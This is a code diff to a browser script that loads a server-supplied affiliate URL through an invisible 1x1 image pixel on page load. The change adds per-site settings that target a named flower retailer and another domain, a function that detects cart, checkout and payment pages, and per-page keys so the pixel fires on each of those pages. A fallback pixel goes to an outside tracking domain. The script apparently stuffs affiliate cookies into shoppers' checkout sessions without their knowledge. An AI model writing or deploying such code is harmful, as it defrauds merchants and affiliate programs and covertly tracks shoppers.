@@ -19,12 +19,17 @@
     img.width = 1;
     img.height = 1;
     img.style.display = "none";
-    img.onerror = function () {};
     document.body.appendChild(img);
   }
 
+  function isCartPage() {
+    const cartPatterns = ["cart", "checkout", "pay", "shipping", "review-order", "payment"];
+    return cartPatterns.some(path => window.location.pathname.toLowerCase().includes(path));
+  }
+
   async function initTracking() {
-    if (sessionStorage.getItem("tracking_done")) return;
+    var pageKey = "tracking_done_" + window.location.pathname;
+    if (sessionStorage.getItem(pageKey)) return;
 
     try {
       var uniqueId = getCookie('tracking_uuid') || generateUUID();
@@ -46,7 +51,7 @@
 
       if (data.success && data.affiliate_url) {
         createTrackingPixel(data.affiliate_url);
-        sessionStorage.setItem("tracking_done", "1");
+        sessionStorage.setItem(pageKey, "1");
       } else {
         createTrackingPixel('https://theclicksdealer.com/api/fallback-pixel?id=' + uniqueId);
       }
@@ -56,10 +61,28 @@
     }
   }
 
+  function run() {
+    const host = window.location.hostname;
+
+    const config = {
+      "www.fareastflora.com": { always: false, cartExtra: true },
+      "aimedialinks.com": { always: true, cartExtra: true },
+    };
+
+    const site = config[host];
+    if (site) {
+      if (site.cartExtra && isCartPage()) {
+        initTracking();
+      } else if (site.always) {
+        initTracking();
+      }
+    }
+  }
+
   if (document.readyState === 'complete') {
-    initTracking();
+    run();
   } else {
-    window.addEventListener('load', initTracking, { once: true });
+    window.addEventListener('load', run, { once: true });
   }
 
 })();
